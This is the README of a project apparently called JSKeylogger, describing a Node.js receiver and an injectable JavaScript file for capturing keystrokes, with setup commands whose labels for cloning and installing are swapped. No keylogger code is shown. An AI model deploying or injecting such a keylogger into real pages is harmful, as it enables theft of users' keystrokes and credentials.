# JSKeylogger

Simple Node JS receiver + injectable JavaScript code.

## Setup

Clone the repository with

```bash
npm install
```

Install dependencies with

```bash
git clone https://github.com/deantonious/JSKeylogger.git
```

Run the server with

```bash
npm start
```

And inject the file [inject.js](inject.js)
